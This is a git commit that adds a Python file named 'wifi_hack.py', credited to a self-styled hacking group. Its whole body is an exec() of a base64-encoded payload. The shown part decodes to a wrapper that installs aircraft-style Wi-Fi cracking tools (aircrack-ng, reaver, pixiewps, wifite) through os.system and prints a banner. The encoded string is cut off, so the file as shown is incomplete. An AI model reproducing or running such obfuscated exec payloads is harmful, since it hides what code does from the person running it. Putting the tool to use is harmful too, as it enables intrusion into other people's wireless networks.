5172904ae5b7f42109e19e3decb86432e6787d8f
Shohanur Rahman Shohan <95478875+shohan1122@users.noreply.github.com>
2022-12-04 19:36:18 +0600

    Create wifi_hack.py

---
+++ wifi_hack.py
@@ -0,0 +1,8 @@
+###########################################################################
+# AUTHOR  : MD SHOHAN                                              #
+#                                                 #
+# HACKING GROUP :Are You Ready Solder                  #
+# YOUTUBE : tecnical bangla                                        #
+###########################################################################
+import marshal,base64
+exec (base64.b64decode("CiMgQ29hZGVyL0FrYXNoQmxhY2tIYXQKIyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBjaGVja19jYWxsCnByaW50KCJcbkluc3RhbGxpbmcgTmVlZGVkIFRvb2xzIikKcHJpbnQoIlxuIikKY21kMCA9IG9zLnN5c3RlbSgiYXB0LWdldCBpbnN0YWxsIGFpcmNyYWNrLW5nIGNydW5jaCB4dGVybSB3b3JkbGlzdHMgcmVhdmVyIHBpeGlld3BzIGJ1bGx5IHh0ZXJtIHdpZml0ZSIpCmNtZCAgPSBvcy5zeXN0ZW0oInNsZWVwIDMgJiYgY2xlYXIiKQpkZWYgaW50cm8oKToKICAgIGNtZCAgPSBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHByaW50KCIiIlwwMzNbMTszMm0K4paI4paI4pWXICAgIOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyAgIOKWiOKWiOKVlyAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICDilojilojilZfilojilojilZfil
